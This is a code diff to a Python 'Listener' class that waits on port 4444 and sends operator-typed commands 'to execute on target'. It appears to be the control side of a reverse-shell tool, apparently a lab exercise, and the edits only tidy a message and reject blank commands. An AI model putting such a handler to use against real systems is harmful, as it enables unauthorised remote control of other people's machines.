@@ -9,7 +9,7 @@ class Listener:
         self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
         self.listener.listen(0)
-        print('Starting self.listener... waiting for connection') #add a threading spinner here
+        print('Starting listener... waiting for connection') #add a threading spinner here
         try:
             self.connection,address = self.listener.accept() #address is tuple with address and port
         except KeyboardInterrupt:
@@ -31,7 +31,13 @@ class Listener:
 
     def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
         while True:
-            cmd = input('Enter command to execute on target:')
+            inputChecker = False
+            while inputChecker == False:
+                cmd = input('Enter command to execute on target:')
+                if cmd == '':
+                    print('Command must not be blank')
+                else:
+                    inputChecker = True
             if cmd != 'bye':
                 result = self.executeCmd(cmd) 
                 print(result)
@@ -42,6 +48,8 @@ class Listener:
           
 
 listener = Listener('10.211.55.5',4444)
+
+
 try:
     listener.run()
 except KeyboardInterrupt:
